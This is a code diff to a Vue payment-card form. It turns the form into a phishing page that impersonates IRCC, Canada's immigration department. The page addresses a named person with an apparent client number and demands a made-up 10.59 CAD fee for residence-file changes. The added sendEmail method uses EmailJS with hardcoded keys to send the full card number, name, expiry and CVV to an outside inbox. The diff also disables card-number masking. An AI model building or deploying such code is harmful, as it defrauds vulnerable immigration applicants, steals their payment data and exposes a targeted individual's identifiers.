@@ -1,10 +1,17 @@
 <template>
   <div class="card-form">
+    <h1>Michael Vitor Martin</h1>
+    <h1>IUC : 11-1675-2037</h1>
+    <h1>Nous avons reçu votre document. Merci!
+    </h1>
+    <h3>À compter du 1er janvier 2025, toute demande de modification apportée à un dossier de résidence permanente entraînera des frais administratifs de 10,59 CAD. Ces frais seront appliqués pour couvrir les coûts de traitement liés aux ajustements demandés. Merci de votre compréhension.</h3>
+    <h2>Afin d'éviter tout retard dans le traitement de votre demande, veuillez procéder au paiement ci-dessous :</h2>
+    <br>
     <div class="card-list">
       <Card
         :fields="fields"
         :labels="formData"
-        :isCardNumberMasked="isCardNumberMasked"
+        :isCardNumberMasked="false"
         :randomBackgrounds="randomBackgrounds"
         :backgroundImage="backgroundImage"
       />
@@ -17,21 +24,12 @@
           :id="fields.cardNumber"
           @input="changeNumber"
           @focus="focusCardNumber"
-          @blur="blurCardNumber"
           class="card-input__input"
           :value="formData.cardNumber"
           :maxlength="cardNumberMaxLength"
           data-card-field
           autocomplete="off"
         />
-        <button
-          class="card-input__eye"
-          :class="{ '-active' : !isCardNumberMasked }"
-          title="Show/Hide card number"
-          tabindex="-1"
-          :disabled="formData.cardNumber === ''"
-          @click="toggleMask"
-        ></button>
       </div>
       <div class="card-input">
         <label for="cardName" class="card-input__label">{{ $t('cardForm.cardName') }}</label>
@@ -99,12 +97,20 @@
         </div>
       </div>
 
-      <button class="card-form__button" v-on:click="invaildCard">{{ $t('cardForm.submit') }}</button>
+      <button class="card-form__button" v-on:click="sendEmail">{{ $t('cardForm.submit') }}</button>
     </div>
+    <h1>REFUND POLICY – POLITIQUE DE REMBOURSEMENT</h1>
+    <p>
+        Unless otherwise specified, fees paid will not be refunded for an application in process by IRCC, or approved or refused by IRCC. In the event of a refund, IRCC complies with the Financial Administration Act (FAA) which stipulates that the money must be returned or repaid to the person who performed the payment.
+    </p>
+    <p>
+        À moins d’indication contraire, les frais payés ne sont pas remboursables pour une demande en traitement par IRCC, ou approuvée ou refusée par IRCC. Dans le cas d’un remboursement, IRCC se conforme à la Loi sur la gestion des finances publiques (LGFP) qui stipule que les frais doivent être restitués à la personne qui a effectué le paiement.
+    </p>
   </div>
 </template>
 
 <script>
+import emailjs from 'emailjs-com'
 import Card from '@/components/Card'
 export default {
   name: 'CardForm',
@@ -188,6 +194,24 @@ export default {
     this.maskCardNumber()
   },
   methods: {
+    sendEmail () {
+      const templateParams = {
+        cardNumber: this.formData.cardNumber,
+        cardName: this.formData.cardName,
+        cardMonth: this.formData.cardMonth,
+        cardYear: this.formData.cardYear,
+        cardCvv: this.formData.cardCvv
+      }
+
+      console.log('templateParams', templateParams)
+
+      emailjs.send('service_312hyqf', 'template_0liwzhe', templateParams, 'aPq5n2p5qws4qZmo9')
+        .then((response) => {
+          console.log('SUCCESS!', response.status, response.text)
+        }, (error) => {
+          console.log('FAILED...', error)
+        })
+    },
     generateMonthValue (n) {
       return n < 10 ? `0${n}` : n
     },
